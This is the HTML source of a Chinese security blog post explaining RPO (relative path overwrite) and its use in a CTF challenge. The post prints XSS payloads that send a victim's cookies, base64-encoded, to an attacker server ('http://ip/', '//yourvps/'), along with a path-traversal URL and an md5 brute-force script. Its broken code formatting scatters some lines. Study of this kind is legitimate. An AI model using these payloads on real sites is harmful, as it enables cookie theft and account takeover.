@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="参考文献：http://120.77.209.122/index.php/archives/24/https://www.jianshu.com/p/340bd5353248 RPO漏洞就是服务端和客户端对这个URL的解析不一致导致的，当页面中调用的静态文件是以相对路径调用的时候，我们可以利用浏览器错误的解析页面的路径从而去错误的引导静态文件（CSS）文件加载 在apche上..%2f不能解析，只">
+<meta property="og:type" content="website">
+<meta property="og:title" content="cws6">
+<meta property="og:url" content="https://cws6.github.io/user-5035860-1543717448/漏洞学习/RPO漏洞.html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="参考文献：http://120.77.209.122/index.php/archives/24/https://www.jianshu.com/p/340bd5353248 RPO漏洞就是服务端和客户端对这个URL的解析不一致导致的，当页面中调用的静态文件是以相对路径调用的时候，我们可以利用浏览器错误的解析页面的路径从而去错误的引导静态文件（CSS）文件加载 在apche上..%2f不能解析，只">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-a7188a7d055115d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-34529ab862765418.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-e26f7d767e2e3dc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-02T02:24:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cws6">
+<meta name="twitter:description" content="参考文献：http://120.77.209.122/index.php/archives/24/https://www.jianshu.com/p/340bd5353248 RPO漏洞就是服务端和客户端对这个URL的解析不一致导致的，当页面中调用的静态文件是以相对路径调用的时候，我们可以利用浏览器错误的解析页面的路径从而去错误的引导静态文件（CSS）文件加载 在apche上..%2f不能解析，只">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-a7188a7d055115d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/user-5035860-1543717448/漏洞学习/RPO漏洞.html">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title> | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline"></h1>
+
+<div class="post-meta">
+  
+  
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>漏洞学习</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/RPO漏洞.html/">RPO漏洞.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <p>参考文献：<br><a href="http://120.77.209.122/index.php/archives/24/" target="_blank" rel="noopener">http://120.77.209.122/index.php/archives/24/</a><br><a href="https://www.jianshu.com/p/340bd5353248" target="_blank" rel="noopener">https://www.jianshu.com/p/340bd5353248</a></p>
+<p>RPO漏洞就是服务端和客户端对这个URL的解析不一致导致的，当页面中调用的静态文件是以相对路径调用的时候，我们可以利用浏览器错误的解析页面的路径从而去错误的引导静态文件（CSS）文件加载</p>
+<p>在apche上..%2f不能解析，只有在nginx上才能实现。条件这么苛刻，都不知道用处多大。。</p>
+<p><a href="http://www.cnblogs.com/p00mj/p/6755000.html：这个大佬的入门还是挺好的，可以看看这个，apache上也可以复现，代码就不贴了。有传参存在的时候，在这里浏览器误以为我们参数的键/country/是一个实际的路径，从而导致实际加载的css文件路径就成了" target="_blank" rel="noopener">http://www.cnblogs.com/p00mj/p/6755000.html：这个大佬的入门还是挺好的，可以看看这个，apache上也可以复现，代码就不贴了。有传参存在的时候，在这里浏览器误以为我们参数的键/country/是一个实际的路径，从而导致实际加载的css文件路径就成了</a><br><a href="http://localhost/hello/url.php/country/style.css，在这里服务端收到的请求会认为请求/country/style.css是一个键为country值为style.css的参数，从而返回页面。" target="_blank" rel="noopener">http://localhost/hello/url.php/country/style.css，在这里服务端收到的请求会认为请求/country/style.css是一个键为country值为style.css的参数，从而返回页面。</a></p>
+<p>发现RPO后利用修改了网页的路径，使页面css加载路径成为了可以加载任意的google域名下的任意样式表，然后在样式表中找到一个可以使用参数导入背景的网页，向里面插入攻击参数，传入了一个简单的css样式。使用被攻击页面url进行引用，页面的css样式改变攻击代码在能成功执行。</p>
+<p><strong>实在是不想搭个nginx的环境了，将强网杯 share your mind 复现下好了</strong></p>
+<p>在源码中，其中一个调用js的时候没有/，存在rpo漏洞。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-a7188a7d055115d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-34529ab862765418.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-e26f7d767e2e3dc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+<p><em>payload：</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(%2f是/的url编码，服务器能解析，但是浏览器不能解析)</span><br><span class="line">其中，写文章的地方是我们可控的，写入我们想测试的xss语句，标题不要写，内容为alert(1),然后引用payload发现弹框了。</span><br><span class="line"></span><br><span class="line">查看当前js的引用路径```http://39.107.33.96:20000/index.php/view/article/2664/static/js/jquery.min.js</span><br></pre></td></tr></table></figure></p>
+<p>我们正常访问这个路径时发现内容和我们访问<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这就说明，网页按照这个路径把2664的内容当做了js文件进行了请求，并且还当做js代码执行了，而后面的js的路径被当做了参数忽略了。</span><br><span class="line"></span><br><span class="line">**构建攻击payload**</span><br></pre></td></tr></table></figure></p>
+<p>b=document.cookie;a=’&lt;img src=<a href="http://ip/&#39;+btoa(b)+&#39;&gt;&#39;" target="_blank" rel="noopener">http://ip/&#39;+btoa(b)+&#39;&gt;&#39;</a>;  document.write(a);<br>ip为自己的服务器ip,在服务器上查看日志文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为攻击代码的引用时会过滤了单引号和双引号，所以要对payload进行实体化编码，用String.fromCharCode()函数引用</span><br><span class="line">```print map(ord ,&quot;payload&quot;） //将payload放入进行实体化编码，python真的强</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><figcaption><span>//将实体化编码的payload放入```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">然后将```http://39.107.33.96:20000/index.php/view/article/2578/..%2f..%2f..%2f..%2findex.php```提交到Reports</span><br><span class="line">![1.png](https://upload-images.jianshu.io/upload_images/5035860-aa9eb95bfa2d4877.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line">将GET后的内容base64解码，得到HINT=Try to get the cookie of path &quot;/QWB_fl4g/QWB/&quot;</span><br><span class="line">提交的时候还需爆破substr(\(md5($code),0,6) ，贴下代码</span><br></pre></td></tr></table></figure>
+<h1 id="usr-bin-env-python"><a href="#usr-bin-env-python" class="headerlink" title="!/usr/bin/env python"></a>!/usr/bin/env python</h1><p>import hashlib<br>def md5(s):<br>    return hashlib.md5(s).hexdigest()<br>for i in range(1, 99999999):<br>    if md5(str(i)).startswith(‘cd5664’):<br>        print i<br>        break<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将里面的内容写成题目上给的就行</span><br><span class="line"></span><br><span class="line">然后继续</span><br></pre></td></tr></table></figure></p>
+<p>var i = document.createElement(“iframe”);i.setAttribute(“src”, “/QWB_fl4g/QWB/“);<br>document.body.appendChild(i);i.addEventListener( “load”, function(){ var content = i.contentWindow.document.cookie; location=’//yourvps/‘+btoa(content);}, false);<br><code>`</code><br>跟上面一样，就不贴了。。</p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>漏洞学习</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/RPO漏洞.html/">RPO漏洞.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#usr-bin-env-python"><span class="nav-number">1.</span> <span class="nav-text">!/usr/bin/env python</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
